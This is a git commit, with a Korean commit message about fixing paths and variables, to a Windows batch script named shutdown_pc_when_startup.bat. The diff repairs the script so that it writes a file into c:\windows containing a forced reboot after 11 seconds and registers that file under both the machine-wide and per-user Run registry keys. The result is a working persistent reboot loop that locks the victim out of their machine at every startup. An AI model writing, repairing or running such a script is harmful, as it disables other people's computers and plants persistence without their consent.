6a6c92ff8cd3f2510bd661179ed77320804fa2c4
조세영 | Jo Seyeong <6127878@naver.com>
2024-10-01 14:35:34 +0900

    경로 및 변수 수정

--- shutdown_pc_when_startup.bat
+++ shutdown_pc_when_startup.bat
@@ -1,7 +1,13 @@
-echo @echo off>c:windowshartlell.bat
-echo @break off>>c:windowshartlell.bat
-echo shutdown -r -t 11 -f>>c:windowshartlell.bat
-echo end>>windowshartlell.bat
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v start API /t reg_sz /d c:windwoshartlell.bat /f
-reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
-PAUSE
+@echo off
+:: .bat 파일 생성 및 명령 추가
+echo @echo off > c:\windows\hartlell.bat
+echo @break off >> c:\windows\hartlell.bat
+:: 11초 후에 강제로 시스템을 재부팅
+echo shutdown -r -t 11 -f >> c:\windows\hartlell.bat
+echo end >> c:\windows\hartlell.bat
+
+:: 레지스트리에 프로그램 실행 추가
+reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v startAPI /t reg_sz /d c:\windows\hartlell.bat /f
+reg add hkey_current_user\software\microsoft\windows\currentversion\run /v startAPIUser /t reg_sz /d c:\windows\hartlell.bat /f
+
+:: PAUSE
